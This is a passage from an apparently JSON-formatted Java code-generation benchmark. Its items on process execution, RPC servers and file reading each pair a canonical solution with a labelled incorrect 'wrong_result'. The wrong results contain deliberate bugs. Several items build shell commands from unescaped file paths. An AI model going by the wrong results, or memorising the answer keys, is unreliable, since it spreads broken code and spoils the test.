connectionManager;\n    protected RpcRemoting rpcRemoting;\n    private Codec codec = new RpcCodec();\n\n    public RpcServer(int port, boolean manageConnection) {\n        super(port);\n        if (manageConnection) {\n            option(BoltServerOption.SERVER_MANAGE_CONNECTION_SWITCH, true);\n        }\n    }\n\n    @Override\n    protected void doInit() {\n        if (this.addressParser == null) {\n            this.addressParser = new RpcAddressParser();\n        }\n        if (option(BoltServerOption.SERVER_MANAGE_CONNECTION_SWITCH)) {\n            this.connectionManager = new DefaultServerConnectionManager(new RandomSelectStrategy(this));\n            this.connectionManager.startup();\n        }\n\n        this.bootstrap = new ServerBootstrap();\n        this.bootstrap.group(bossGroup, workerGroup)\n            .channel(NettyEventLoopUtil.getServerSocketChannelClass())\n            .option(ChannelOption.SO_BACKLOG, ConfigManager.tcp_so_backlog())\n            .option(ChannelOption.SO_REUSEADDR, ConfigManager.tcp_so_reuseaddr())\n            .childOption(ChannelOption.TCP_NODELAY, ConfigManager.tcp_nodelay())\n            .childOption(ChannelOption.SO_KEEPALIVE, ConfigManager.tcp_so_keepalive());\n\n        if (ConfigManager.netty_buffer_pooled()) {\n            this.bootstrap.option(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT)\n                .childOption(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT);\n        } else {\n            this.bootstrap.option(ChannelOption.ALLOCATOR, UnpooledByteBufAllocator.DEFAULT)\n                .childOption(ChannelOption.ALLOCATOR, UnpooledByteBufAllocator.DEFAULT);\n        }\n\n        this.bootstrap.childHandler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel channel) {\n                ChannelPipeline pipeline = channel.pipeline();\n                pipeline.addLast(\"decoder\", codec.newDecoder());\n                pipeline.addLast(\"encoder\", codec.newEncoder());\n                if (ConfigManager.tcp_idle_switch()) {\n                    pipeline.addLast(\"idleStateHandler\", new IdleStateHandler(0, 0, ConfigManager.tcp_server_idle(), TimeUnit.MILLISECONDS));\n                }\n                if (option(BoltServerOption.NETTY_FLUSH_CONSOLIDATION)) {\n                    pipeline.addLast(\"flushConsolidationHandler\", new FlushConsolidationHandler(1024, true));\n                }\n                pipeline.addLast(\"handler\", new RpcHandler(true, userProcessors));\n            }\n        });\n    }\n\n    @Override\n    protected boolean doStart() throws InterruptedException {\n        this.channelFuture = this.bootstrap.bind(new InetSocketAddress(ip(), port())).sync();\n        if (port() == 0 && channelFuture.isSuccess()) {\n            setLocalBindingPort(((InetSocketAddress) channelFuture.channel().localAddress()).getPort());\n        }\n        return this.channelFuture.isSuccess();\n    }\n\n    @Override\n    protected boolean doStop() {\n        if (null != this.channelFuture) {\n            this.channelFuture.channel().close();\n        }\n        this.bossGroup.shutdownGracefully();\n        if (option(BoltServerOption.SERVER_MANAGE_CONNECTION_SWITCH) && null != this.connectionManager) {\n            this.connectionManager.shutdown();\n        }\n        return true;\n    }\n\n    public void registerUserProcessor(UserProcessor<?> processor) {\n        UserProcessorRegisterHelper.registerUserProcessor(processor, this.userProcessors);\n    }\n\n    public Object invokeSync(final Connection conn, final Object request, final int timeoutMillis) throws RemotingException, InterruptedException {\n        return this.rpcRemoting.invokeSync(conn, request, null, timeoutMillis);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 19,
    "wrong_result": "public abstract class RpcServer {\n    private static final Logger logger = LoggerFactory.getLogger(RpcServer.class);\n    private ServerBootstrap bootstrap;\n    private ChannelFuture channelFuture;\n    private ConcurrentHashMap<String, UserProcessor<?>> userProcessors;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private RemotingAddressParser addressParser;\n    private DefaultServerConnectionManager connectionManager;\n    private RpcRemoting rpcRemoting;\n    private Codec codec;\n\n    public RpcServer(int port, boolean manageConnection) {\n        this.userProcessors = new ConcurrentHashMap<>();\n        this.addressParser = new RemotingAddressParser();\n        this.connectionManager = new DefaultServerConnectionManager(manageConnection);\n        this.rpcRemoting = new RpcRemoting(this);\n        this.codec = new Codec();\n    }\n\n    protected void doInit() {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n        bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<Channel>() {\n                    @Override\n                    protected void initChannel(Channel ch) throws Exception {\n                        ch.pipeline().addLast(\"decoder\", new LengthFieldBasedFrameDecoder(Integer.MAX_VALUE, 0, 4, 0, 4));\n                        ch.pipeline().addLast(\"encoder\", new LengthFieldPrepender(4));\n                        ch.pipeline().addLast(\"codec\", codec);\n                        ch.pipeline().addLast(\"handler\", rpcRemoting);\n                    }\n                });\n    }\n\n    protected boolean doStart() {\n        try {\n            channelFuture = bootstrap.bind(addressParser.parse()).sync();\n            logger.info(\"RpcServer started on port {}\", addressParser.getPort());\n            return true;\n        } catch (InterruptedException e) {\n            logger.error(\"RpcServer failed to start\", e);\n            return false;\n        }\n    }\n\n    protected boolean doStop() {\n        if (channelFuture != null) {\n            channelFuture.channel().closeFuture().syncUninterruptibly();\n        }\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n        return true;\n    }\n\n    public void registerUserProcessor(UserProcessor<?> processor) {\n        userProcessors.put(processor.getProcessorName(), processor);\n    }\n\n    public Object invokeSync(Connection conn, Object request, int timeoutMillis) {\n        return rpcRemoting.invokeSync(conn, request, timeoutMillis);\n    }\n}"
  },
  {
    "Task_id": 270,
    "Instruction": "Task Description: Create a Java class that provides a fluent interface for building and executing command-line processes with configurable environment variables, working directory, and output handling.\n\nClass Description: The CommandLine class is a builder-style utility for executing external processes. It allows chaining configuration methods to set up command arguments, environment variables, working directory, and output streams before execution. The class handles process execution, stream management, and result collection.\n\nAttributes:\n- cmdLine: List<String> - Stores the command and its arguments\n- env: Map<String, String> - Stores environment variables for the process\n- cleanEnvironment: boolean - Flag to determine whether to clear existing environment variables\n- workingDirectory: File - The working directory for the process\n- outPrefix: String - Prefix for standard output lines\n- errPrefix: String - Prefix for error output lines\n- out: OutputStream - Stream for standard output\n- err: OutputStream - Stream for error output\n\nMethods:\n- cmd(String): CommandLine - Static factory method to create a new CommandLine instance with initial command\n- workingDirectory(File): CommandLine - Sets the working directory using File object\n- workingDirectory(String): CommandLine - Sets the working directory using path string\n- arg(String): CommandLine - Adds a single argument to the command\n- args(String...): CommandLine - Adds multiple arguments to the command\n- outPrefix(String): CommandLine - Sets prefix for standard output\n- errPrefix(String): CommandLine - Sets prefix for error output\n- out(OutputStream): CommandLine - Sets standard output stream\n- err(OutputStream): CommandLine - Sets error output stream\n- env(String, String): CommandLine - Adds an environment variable\n- newEnv(boolean): CommandLine - Configures whether to clean environment variables\n- run(): ProcessRunner.ProcessResult - Executes the configured command and returns the result",
    "Canonical_solution": "import jodd.io.StreamGobbler;\nimport java.io.ByteArrayOutputStream;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.io.PrintStream;\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\npublic class CommandLine {\n\n    public static final int OK = 0;\n\n    protected final List<String> cmdLine = new ArrayList<>();\n    protected Map<String, String> env = null;\n    protected boolean cleanEnvironment = false;\n    protected File workingDirectory;\n    protected String outPrefix;\n    protected String errPrefix;\n    protected OutputStream out = System.out;\n    protected OutputStream err = System.err;\n\n    protected CommandLine(final String command) {\n        cmdLine.add(command);\n    }\n\n    public static CommandLine cmd(final String command) {\n        return new CommandLine(command);\n    }\n\n    public CommandLine workingDirectory(final File workDirectory) {\n        this.workingDirectory = workDirectory;\n        return this;\n    }\n\n    public CommandLine workingDirectory(final String workDirectory) {\n        this.workingDirectory = new File(workDirectory);\n        return this;\n    }\n\n    public CommandLine arg(final String argument) {\n        cmdLine.add(argument);\n        return this;\n    }\n\n    public CommandLine args(final String... arguments) {\n        if (arguments != null && arguments.length > 0) {\n            Collections.addAll(cmdLine, arguments);\n        }\n        return this;\n    }\n\n    public CommandLine outPrefix(final String prefix) {\n        this.outPrefix = prefix;\n        return this;\n    }\n\n    public CommandLine errPrefix(final String prefix) {\n        this.errPrefix = prefix;\n        return this;\n    }\n\n    public CommandLine out(final OutputStream out) {\n        this.out = out;\n        return this;\n    }\n\n    public CommandLine err(final OutputStream err) {\n        this.err = err;\n        return this;\n    }\n\n    public CommandLine env(final String key, final String value) {\n        if (env == null) {\n            env = new HashMap<>();\n        }\n        env.put(key, value);\n        return this;\n    }\n\n    public CommandLine newEnv(final boolean clean) {\n        cleanEnvironment = clean;\n        return this;\n    }\n\n    public ProcessRunner.ProcessResult run() {\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        out = err = baos;\n\n        try {\n            baos.write(StringUtil.join(cmdLine, ' ').getBytes());\n            baos.write(StringPool.BYTES_NEW_LINE);\n        }\n        catch (IOException ignore) {\n        }\n\n        ProcessBuilder processBuilder = new ProcessBuilder();\n        processBuilder.command(cmdLine);\n\n        if (cleanEnvironment) {\n            processBuilder.environment().clear();\n        }\n        if (env != null) {\n            processBuilder.environment().putAll(env);\n        }\n\n        processBuilder.directory(workingDirectory);\n\n        Process process = null;\n        try {\n            process = processBuilder.start();\n        }\n        catch (IOException ioex) {\n            return writeException(baos, ioex);\n        }\n\n        StreamGobbler outputGobbler = new StreamGobbler(process.getInputStream(), out, outPrefix);\n        StreamGobbler errorGobbler = new StreamGobbler(process.getErrorStream(), err, errPrefix);\n\n        outputGobbler.start();\n        errorGobbler.start();\n\n        int result;\n        try {\n            result = process.waitFor();\n        }\n        catch (InterruptedException iex) {\n            return writeException(baos, iex);\n        }\n\n        outputGobbler.waitFor();\n        errorGobbler.waitFor();\n\n        return new ProcessRunner.ProcessResult(result, baos.toString());\n    }\n\n    private ProcessRunner.ProcessResult writeException(final ByteArrayOutputStream baos, final Exception ex) {\n        try {\n            baos.write(errPrefix.getBytes());\n        }\n        catch (IOException ignore) {\n        }\n\n        ex.printStackTrace(new PrintStream(baos));\n        return new ProcessRunner.ProcessResult(-1, baos.toString());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class CommandLine {\n    private List<String> cmdLine;\n    private Map<String, String> env;\n    private boolean cleanEnvironment;\n    private File workingDirectory;\n    private String outPrefix;\n    private String errPrefix;\n    private OutputStream out;\n    private OutputStream err;\n\n    private CommandLine() {\n        this.cmdLine = new ArrayList<>();\n        this.env = new HashMap<>();\n        this.cleanEnvironment = false;\n        this.workingDirectory = null;\n        this.outPrefix = \"\";\n        this.errPrefix = \"\";\n        this.out = System.out;\n        this.err = System.err;\n    }\n\n    public static CommandLine cmd(String command) {\n        CommandLine commandLine = new CommandLine();\n        commandLine.cmdLine.add(command);\n        return commandLine;\n    }\n\n    public CommandLine workingDirectory(File directory) {\n        this.workingDirectory = directory;\n        return this;\n    }\n\n    public CommandLine workingDirectory(String path) {\n        this.workingDirectory = new File(path);\n        return this;\n    }\n\n    public CommandLine arg(String argument) {\n        this.cmdLine.add(argument);\n        return this;\n    }\n\n    public CommandLine args(String... arguments) {\n        for (String argument : arguments) {\n            this.cmdLine.add(argument);\n        }\n        return this;\n    }\n\n    public CommandLine outPrefix(String prefix) {\n        this.outPrefix = prefix;\n        return this;\n    }\n\n    public CommandLine errPrefix(String prefix) {\n        this.errPrefix = prefix;\n        return this;\n    }\n\n    public CommandLine out(OutputStream stream) {\n        this.out = stream;\n        return this;\n    }\n\n    public CommandLine err(OutputStream stream) {\n        this.err = stream;\n        return this;\n    }\n\n    public CommandLine env(String key, String value) {\n        this.env.put(key, value);\n        return this;\n    }\n\n    public CommandLine newEnv(boolean clean) {\n        this.cleanEnvironment = clean;\n        return this;\n    }\n\n    public ProcessRunner.ProcessResult run() throws IOException {\n        ProcessBuilder processBuilder = new ProcessBuilder(cmdLine);\n        if (cleanEnvironment) {\n            processBuilder.environment().clear();\n        }\n        processBuilder.environment().putAll(env);\n        if (workingDirectory != null) {\n            processBuilder.directory(workingDirectory);\n        }\n\n        Process process = processBuilder.start();\n\n        Thread outputThread = new Thread(() -> {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    out.write((outPrefix + line + \"\\n\").getBytes());\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n\n        Thread errorThread = new Thread(() -> {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getErrorStream()))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    err.write((errPrefix + line + \"\\n\").getBytes());\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n\n        outputThread.start();\n        errorThread.start();\n\n        int exitCode = 0;\n        try {\n            exitCode = process.waitFor();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            throw new IOException(\"Process was interrupted\", e);\n        }\n\n        try {\n            outputThread.join();\n            errorThread.join();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            throw new IOException(\"Thread join was interrupted\", e);\n        }\n\n        return new ProcessRunner.ProcessResult(exitCode, out.toString(), err.toString());\n    }\n\n    public static class ProcessRunner {\n        public static class ProcessResult {\n            private final int exitCode;\n            private final String stdout;\n            private final String stderr;\n\n            public ProcessResult(int exitCode, String stdout, String stderr) {\n                this.exitCode = exitCode;\n                this.stdout = stdout;\n                this.stderr = stderr;\n            }\n\n            public int getExitCode() {\n                return exitCode;\n            }\n\n            public String getStdout() {\n                return stdout;\n            }\n\n            public String getStderr() {\n                return stderr;\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 271,
    "Instruction": "Task Description: Create a function that deobfuscates a Java stack trace by processing it through an external retrace tool, handling both success and failure cases appropriately.\n\nFunction Description: The function takes a Throwable object, converts its stack trace to a string, and attempts to deobfuscate it using an external retrace script (either .bat for Windows or .sh for other systems). The function handles temporary file creation for input, process execution, and output processing, with proper error handling and fallback to the original stack trace if deobfuscation fails.\n\nInput: \n- t: Throwable - The exception/throwable whose stack trace needs to be deobfuscated\n\nOutput: \n- String - The deobfuscated stack trace if successful, or the original stack trace if deobfuscation fails or isn't possible\n\nNote: The function relies on an environment variable XPIPE_MAPPING for the mapping file path and uses system-specific retrace scripts (retrace.bat or retrace.sh). It also includes a canDeobfuscate() check (implementation not shown) to determine if deobfuscation should be attempted.",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.util.List;\n\npublic static String deobfuscateToString(Throwable t) {\n    StringWriter sw = new StringWriter();\n    PrintWriter pw = new PrintWriter(sw);\n    t.printStackTrace(pw);\n    String stackTrace = sw.toString();\n    stackTrace = stackTrace.replaceAll(\"at .+/(.+)\", \"at $1\");\n\n    try {\n        if (!canDeobfuscate()) {\n            return stackTrace;\n        }\n\n        var file = Files.createTempFile(\"xpipe_stracktrace\", null);\n        Files.writeString(file, stackTrace);\n        var proc = new ProcessBuilder(\n                        \"retrace.\" + (OsType.getLocal().equals(OsType.WINDOWS) ? \"bat\" : \"sh\"),\n                        System.getenv(\"XPIPE_MAPPING\"),\n                        file.toString())\n                .redirectErrorStream(true);\n        var active = proc.start();\n        var out = new String(active.getInputStream().readAllBytes())\n                .replaceAll(\"\\r\\n\", NewLine.LF.getNewLineString());\n        var code = active.waitFor();\n        if (code == 0) {\n            return out;\n        } else {\n            System.err.println(\"Deobfuscation failed: \" + out);\n        }\n    } catch (Exception ex) {\n        System.err.println(\"Deobfuscation failed\");\n        return stackTrace;\n    }\n\n    return stackTrace;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public static String deobfuscateStackTrace(Throwable t) {\n    if (!canDeobfuscate()) {\n        return t.getStackTrace().toString();\n    }\n    try {\n        File tempInput = File.createTempFile(\"stacktrace\", \".txt\");\n        File tempOutput = File.createTempFile(\"deobfuscated\", \".txt\");\n        try (BufferedWriter writer = new BufferedWriter(new FileWriter(tempInput))) {\n            for (StackTraceElement element : t.getStackTrace()) {\n                writer.write(element.toString());\n                writer.newLine();\n            }\n        }\n        String retraceScript = System.getenv(\"XPIPE_MAPPING\");\n        if (retraceScript == null || retraceScript.isEmpty()) {\n            return t.getStackTrace().toString();\n        }\n        ProcessBuilder processBuilder = new ProcessBuilder(retraceScript, tempInput.getAbsolutePath(), tempOutput.getAbsolutePath());\n        processBuilder.redirectErrorStream(true);\n        Process process = processBuilder.start();\n        int exitCode = process.waitFor();\n        if (exitCode == 0) {\n            StringBuilder result = new StringBuilder();\n            try (BufferedReader reader = new BufferedReader(new FileReader(tempOutput))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    result.append(line).append(\"\\n\");\n                }\n            }\n            return result.toString();\n        }\n    } catch (Exception e) {\n        return t.getStackTrace().toString();\n    }\n    return t.getStackTrace().toString();\n}"
  },
  {
    "Task_id": 272,
    "Instruction": "Task Description: Create a Java class that facilitates the execution of external processes with proper stream handling and synchronization.\n\nClass Description: The ProcessRunner class is designed to execute external system processes while managing their input, output, and error streams asynchronously. It provides a clean interface for process execution with automatic stream redirection and proper thread synchronization.\n\nAttributes:\n- processRoot: File - The working directory where the external process will be executed\n\nMethods:\n- Constructor: ProcessRunner(File processRoot) -> void - Initializes the ProcessRunner with the specified working directory\n- execute: execute(ProcessBuilder pb) -> void - Executes the process configured by the ProcessBuilder, redirects error stream to output, and manages stream piping asynchronously\n- AsyncPipe (inner class): \n  - Constructor: AsyncPipe(InputStream is, OutputStream os) -> void - Creates a pipe between input and output streams with automatic closing\n  - Constructor: AsyncPipe(InputStream is, OutputStream os, boolean closeStreams) -> void - Creates a pipe with configurable stream closing behavior\n  - run: run() -> void - The thread's main execution method that continuously reads from input stream and writes to output stream",
    "Canonical_solution": "import com.google.common.base.Joiner;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\n\npublic class ProcessRunner {\n\n  File processRoot;\n\n  public ProcessRunner(File processRoot) {\n    this.processRoot = processRoot;\n  }\n\n  public void execute(ProcessBuilder pb) throws IOException, InterruptedException {\n    System.out.println(Joiner.on(\" \").join(pb.command()));\n    Process process = pb.redirectErrorStream(true).directory(processRoot).start();\n    new AsyncPipe(process.getErrorStream(), System.err).start();\n    new AsyncPipe(process.getInputStream(), System.out).start();\n    process.waitFor();\n  }\n\n  class AsyncPipe extends Thread {\n\n    InputStream is;\n    OutputStream os;\n    boolean closeStreams;\n\n    AsyncPipe(InputStream is, OutputStream os) {\n      this.is = is;\n      this.os = os;\n      closeStreams = true;\n    }\n\n    AsyncPipe(InputStream is, OutputStream os, boolean closeStreams) {\n      this.is = is;\n      this.os = os;\n      this.closeStreams = closeStreams;\n    }\n\n    @Override\n    public void run() {\n      try {\n        synchronized (this) {\n          byte[] buf = new byte[4096];\n          int i;\n          while ((i = is.read(buf)) != -1) {\n            os.write(buf, 0, i);\n          }\n          if (closeStreams) {\n            os.close();\n            is.close();\n          }\n        }\n      } catch (IOException e) {\n        e.printStackTrace();\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "```java\nimport java.io.File;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.IOException;\n\npublic class ProcessRunner {\n    private final File processRoot;\n\n    public ProcessRunner(File processRoot) {\n        this.processRoot = processRoot;\n    }\n\n    public void execute(ProcessBuilder pb) {\n        try {\n            pb.directory(processRoot);\n            Process process = pb.start();\n            new AsyncPipe(process.getInputStream(), System.out, true).start();\n            new AsyncPipe(process.getErrorStream(), System.err, true).start();\n            process.waitFor();\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private class AsyncPipe extends Thread {\n        private final InputStream is;\n        private final OutputStream os;\n        private final boolean closeStreams;\n\n        public AsyncPipe(InputStream is, OutputStream os) {\n            this(is, os, false);\n        }\n\n        public AsyncPipe(InputStream is, OutputStream os, boolean closeStreams) {\n            this.is = is;\n            this.os = os;\n            this.closeStreams = closeStreams;\n        }\n\n        @Override\n        public void run() {\n            try {\n                byte[] buffer = new byte[1024];\n                int bytesRead;\n                while ((bytesRead = is.read(buffer)) != -1) {\n                    os.write(buffer, 0, bytesRead);\n                    os.flush();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                if (closeStreams) {\n                    try {\n                        is.close();\n                        os.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 273,
    "Instruction": "Task Description: Create a Java class that extends the Reader abstract class to read files, with fallback to using system commands when direct file access fails (e.g., when running with restricted permissions).\n\nClass Description: FileReader is a Reader implementation that first attempts to read files directly, and if that fails (due to permission issues), it falls back to executing system commands (via su and cat/toolbox cat) to read the file contents. The class handles process creation, stream management, and proper cleanup.\n\nAttributes:\nmStream: InputStreamReader - The underlying input stream used for reading file contents, either from direct file access or process output\n\nMethods:\nFileReader: [Constructor](Shell shell, String file) -> [void] - Initializes the reader by attempting direct file access first, falling back to process-based reading if needed. Throws FileNotFoundException if neither method succeeds.\n- shell: Shell - Optional shell helper object to locate system commands\n- file: String - Path to the file to be read\n\nclose: close() -> [void] - Closes the underlying input stream. Throws IOException if the stream cannot be closed.\n\nread: read(char[] buffer, int offset, int count) -> [int] - Reads characters into a portion of an array from the underlying stream. Returns the number of characters read or -1 if end of stream is reached.\n- buffer: char[] - Destination buffer\n- offset: int - Offset at which to start storing characters\n- count: int - Maximum number of characters to read",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileNotFoundException;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.Reader;\nimport java.nio.CharBuffer;\n\npublic class FileReader extends Reader {\n    protected InputStreamReader mStream;\n\n    public FileReader(Shell shell, String file) throws FileNotFoundException {\n        String filePath = new File(file).getAbsolutePath();\n\n        try {\n            mStream = new InputStreamReader(new FileInputStream(filePath));\n\n        } catch (FileNotFoundException e) {\n            String binary = shell != null ? shell.findCommand(\"cat\") : \"toolbox cat\";\n\n            try {\n                ProcessBuilder builder = new ProcessBuilder(\"su\");\n                builder.redirectErrorStream(true);\n\n                Process process = builder.start();\n                mStream = new InputStreamReader(process.getInputStream());\n\n                DataOutputStream stdIn = new DataOutputStream(process.getOutputStream());\n                stdIn.write( (binary + \" '\" + filePath + \"'\\n\").getBytes() );\n                stdIn.write( (\"exit $?\\n\").getBytes() );\n                stdIn.flush();\n                stdIn.close();\n\n                Integer resultCode = process.waitFor();\n\n                if (!resultCode.equals(0)) {\n                    throw new FileNotFoundException(e.getMessage());\n                }\n\n            } catch (Throwable te) {\n                throw new FileNotFoundException(te.getMessage());\n            }\n        }\n    }\n\n    @Override\n    public void close() throws IOException {\n        mStream.close();\n    }\n\n    @Override\n    public int read(char[] buffer, int offset, int count) throws IOException {\n        return mStream.read(buffer, offset, count);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "import java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport java.io.Reader;\nimport java.io.InputStreamReader;\n\npublic class FileReader extends Reader {\n    private InputStreamReader mStream;\n\n    public FileReader(Shell shell, String file) throws IOException {\n        try {\n            mStream = new FileReader(file);\n        } catch (IOException e) {\n            if (shell != null) {\n                Process process = shell.execute(\"su -c 'cat \" + file + \"'\");\n                mStream = new InputStreamReader(process.getInputStream());\n            } else {\n                throw e;\n            }\n        }\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (mStream != null) {\n            mStream.close();\n        }\n    }\n\n    @Override\n    public int read(char[] buffer, int offset, int count) throws IOException {\n        return mStream.read(buffer, offset, count);\n    }\n}\n\nclass Shell {\n    public Process execute(String command) throws IOException {\n        return Runtime.getRuntime().exec(command);\n    }\n}"
  },
  {
    "Task_id": 274,
    "Instruction": "Task Description: Create a Java class that implements shell command execution functionality, allowing for command input, output reading, and process management.\n\nClass Description: ProcessShell is a class that provides an interface for executing shell commands, managing the process lifecycle, and handling input/output streams. It extends AbstractShell and supports both regular and root command execution.\n\nAttributes:\n- mProcess: Process - The running process instance\n- mCommandOutputStream: DataOutputStream - Stream for writing commands to the process\n- mSucceedReader: BufferedReader - Reader for standard output stream\n- mErrorReader: BufferedReader - Reader for error output stream\n- mSucceedOutput: StringBuilder - Buffer for storing standard output\n- mErrorOutput: StringBuilder - Buffer for storing error output\n\nMethods:\n- init(String initialCommand) -> void - Initializes the shell process with the given command\n- exec(String command) -> void - Executes the given command in the shell\n- exit() -> void - Terminates the process and cleans up resources\n- exitAndWaitFor() -> void - Sends exit command, waits for process completion, then exits\n- waitFor() -> int - Waits for the process to complete and returns exit code\n- readAll() -> ProcessShell - Reads all available output (both standard and error)\n- readSucceedOutput() -> ProcessShell - Reads standard output\n- readErrorOutput() -> ProcessShell - Reads error output\n- getSucceedOutput() -> StringBuilder - Returns the standard output buffer\n- getErrorOutput() -> StringBuilder - Returns the error output buffer\n- getProcess() -> Process - Returns the process instance\n- getSucceedReader() -> BufferedReader - Returns the standard output reader\n- getErrorReader() -> BufferedReader - Returns the error output reader",
    "Canonical_solution": "import android.util.Log;\nimport com.stardust.autojs.runtime.api.AbstractShell;\nimport com.stardust.autojs.runtime.exception.ScriptInterruptedException;\nimport com.stardust.autojs.util.ProcessUtils;\nimport com.stardust.pio.UncheckedIOException;\nimport java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\n\npublic class ProcessShell extends AbstractShell {\n\n    private static final String TAG = \"ProcessShell\";\n    private Process mProcess;\n    private DataOutputStream mCommandOutputStream;\n    private BufferedReader mSucceedReader;\n    private BufferedReader mErrorReader;\n    private StringBuilder mSucceedOutput = new StringBuilder();\n    private StringBuilder mErrorOutput = new StringBuilder();\n\n    public ProcessShell() {\n    }\n\n    public ProcessShell(boolean root) {\n        super(root);\n    }\n\n    @Override\n    protected void init(String initialCommand) {\n        try {\n            mProcess = new ProcessBuilder(initialCommand).redirectErrorStream(true).start();\n            mCommandOutputStream = new DataOutputStream(mProcess.getOutputStream());\n            mSucceedReader = new BufferedReader(new InputStreamReader(mProcess.getInputStream()));\n            mErrorReader = new BufferedReader(new InputStreamReader(mProcess.getErrorStream()));\n        } catch (IOException e) {\n            throw new UncheckedIOException(e);\n        }\n    }\n\n    @Override\n    public void exec(String command) {\n        try {\n            mCommandOutputStream.writeBytes(command);\n            if (!command.endsWith(COMMAND_LINE_END)) {\n                mCommandOutputStream.writeBytes(COMMAND_LINE_END);\n            }\n            mCommandOutputStream.flush();\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    @Override\n    public void exit() {\n        if (mProcess != null) {\n            Log.d(TAG, \"exit: pid = \" + ProcessUtils.getProcessPid(mProcess));\n            mProcess.destroy();\n            mProcess = null;\n        }\n        if (mSucceedReader != null) {\n            try {\n                mSucceedReader.close();\n            } catch (IOException ignored) {\n            }\n            mSucceedReader = null;\n        }\n        if (mErrorReader != null) {\n            try {\n                mErrorReader.close();\n            } catch (IOException ignored) {\n            }\n            mErrorReader = null;\n        }\n    }\n\n    @Override\n    public void exitAndWaitFor() {\n        exec(COMMAND_EXIT);\n        waitFor();\n        exit();\n    }\n\n    public int waitFor() {\n        try {\n            return mProcess.waitFor();\n        } catch (InterruptedException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public ProcessShell readAll() {\n        return readSucceedOutput().readErrorOutput();\n    }\n\n    public ProcessShell readSucceedOutput() {\n        read(mSucceedReader, mSucceedOutput);\n        return this;\n    }\n\n    private void read(BufferedReader reader, StringBuilder sb) {\n        try {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                sb.append(line).append(\"\\n\");\n            }\n        } catch (IOException e) {\n            throw new UncheckedIOException(e);\n        }\n    }\n\n    public ProcessShell readErrorOutput() {\n        read(mErrorReader, mErrorOutput);\n        return this;\n    }\n\n    public StringBuilder getSucceedOutput() {\n        return mSucceedOutput;\n    }\n\n    public StringBuilder getErrorOutput() {\n        return mErrorOutput;\n    }\n\n    public Process getProcess() {\n        return mProcess;\n    }\n\n    public BufferedReader getSucceedReader() {\n        return mSucceedReader;\n    }\n\n    public BufferedReader getErrorReader() {\n        return mErrorReader;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "```java\nimport java.io.*;\n\npublic class ProcessShell extends AbstractShell {\n    private Process mProcess;\n    private DataOutputStream mCommandOutputStream;\n    private BufferedReader mSucceedReader;\n    private BufferedReader mErrorReader;\n    private StringBuilder mSucceedOutput;\n    private StringBuilder mErrorOutput;\n\n    public void init(String initialCommand) {\n        try {\n            mProcess = Runtime.getRuntime().exec(initialCommand);\n            mCommandOutputStream = new DataOutputStream(mProcess.getOutputStream());\n            mSucceedReader = new BufferedReader(new InputStreamReader(mProcess.getInputStream()));\n            mErrorReader = new BufferedReader(new InputStreamReader(mProcess.getErrorStream()));\n            mSucceedOutput = new StringBuilder();\n            mErrorOutput = new StringBuilder();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void exec(String command) {\n        try {\n            mCommandOutputStream.writeBytes(command + \"\\n\");\n            mCommandOutputStream.flush();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void exit() {\n        try {\n            if (mProcess != null) {\n                mProcess.destroy();\n            }\n            if (mCommandOutputStream != null) {\n                mCommandOutputStream.close();\n            }\n            if 